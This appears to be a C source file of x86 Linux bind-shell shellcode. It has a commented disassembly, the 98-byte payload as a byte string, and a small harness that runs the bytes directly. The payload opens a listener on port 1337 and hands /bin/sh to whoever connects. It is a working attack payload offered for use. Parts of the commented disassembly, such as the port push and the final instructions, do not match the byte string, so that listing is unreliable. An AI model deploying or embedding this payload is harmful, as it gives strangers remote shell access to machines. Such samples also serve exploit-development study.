/*

Bind TCP Shellcode
Size: 98 bytes
Listens on port 1337 (\x05\x39)

=> 0x08048080 <+0>:	xor    eax,eax
   0x08048082 <+2>:	xor    ebx,ebx
   0x08048084 <+4>:	mov    al,0x66
   0x08048086 <+6>:	xor    esi,esi
   0x08048088 <+8>:	mov    bl,0x1
   0x0804808a <+10>:	push   esi
   0x0804808b <+11>:	push   ebx
   0x0804808c <+12>:	push   0x2
   0x0804808e <+14>:	mov    ecx,esp
   0x08048090 <+16>:	int    0x80
   0x08048092 <+18>:	xchg   esi,eax
   0x08048093 <+19>:	mov    al,0x66
   0x08048095 <+21>:	pop    ebx
   0x08048096 <+22>:	xor    edx,edx
   0x08048098 <+24>:	push   edx
   0x08048099 <+25>:	pushw  0xb822
   0x0804809d <+29>:	push   bx
   0x0804809f <+31>:	mov    ecx,esp
   0x080480a1 <+33>:	push   0x10
   0x080480a3 <+35>:	push   ecx
   0x080480a4 <+36>:	push   esi
   0x080480a5 <+37>:	mov    ecx,esp
   0x080480a7 <+39>:	int    0x80
   0x080480a9 <+41>:	mov    al,0x66
   0x080480ab <+43>:	mov    bl,0x4
   0x080480ad <+45>:	push   ebx
   0x080480ae <+46>:	push   esi
   0x080480af <+47>:	mov    ecx,esp
   0x080480b1 <+49>:	int    0x80
   0x080480b3 <+51>:	mov    al,0x66
   0x080480b5 <+53>:	push   edx
   0x080480b6 <+54>:	push   edx
   0x080480b7 <+55>:	push   esi
   0x080480b8 <+56>:	mov    ecx,esp
   0x080480ba <+58>:	inc    ebx
   0x080480bb <+59>:	int    0x80
   0x080480bd <+61>:	xchg   esi,ebx
   0x080480bf <+63>:	xor    ecx,ecx
   0x080480c1 <+65>:	mov    cl,0x2
   
Dump of assembler code for function duploop:
=> 0x080480c3 <+0>:	mov    al,0x3f
   0x080480c5 <+2>:	int    0x80
   0x080480c7 <+4>:	dec    ecx
   0x080480c8 <+5>:	jns    0x80480c3 <duploop>
   0x080480ca <+7>:	mov    al,0xb
   0x080480cc <+9>:	push   edx
   0x080480cd <+10>:	push   0x68732f2f
   0x080480d2 <+15>:	push   0x6e69622f
   0x080480d7 <+20>:	mov    ebx,esp
   0x080480d9 <+22>:	mov    ecx,edx
   0x080480db <+24>:	int    0x80
*/

#include<stdio.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\x31\xf6\xb3\x01\x56\x53\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x5b\x31\xd2\x52\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x53\x56\x89\xe1\xcd\x80\xb0\x66\x52\x52\x56\x89\xe1\x43\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}

